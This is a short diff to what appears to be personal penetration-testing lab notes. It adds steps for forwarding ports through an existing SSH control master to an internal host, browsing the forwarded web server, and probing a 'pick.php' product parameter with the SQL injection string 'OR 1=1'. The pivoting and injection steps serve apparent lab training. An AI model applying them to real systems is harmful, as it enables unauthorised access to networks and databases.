@@ -114,17 +114,17 @@ Content-Type: text/html; charset=iso-8859-1
 </body></html>
 ```
 ______________________________________________________________________________________________________________
-## 
-### 
-
+## Set up a tunnel through the MS you already have to access the SSH/HTTP ports
+### If you regularly SSH'd into the box close it and look for the SSH -MS command above
+    ssh -S /tmp/jump jump -O forward -L20001:192.168.28.181:22 -L20002:192.168.28.181:80
 ______________________________________________________________________________________________________________
-## 
-### 
-
+## Now can run firefox to connect to the webserver
+### Utilize the port forward we made in the above and use loopback
+    firefox http://127.0.0.1:20002
 ______________________________________________________________________________________________________________
-## 
-### 
-
+## Now once on the webpage observe the "Product Selections"
+### Only need to select one and then change the number to see which field is vulnerable
+    http://127.0.0.1:20002/pick.php?product=7 OR 1=1        #the vuln field because displays everything
 ______________________________________________________________________________________________________________
 ## 
 ### 
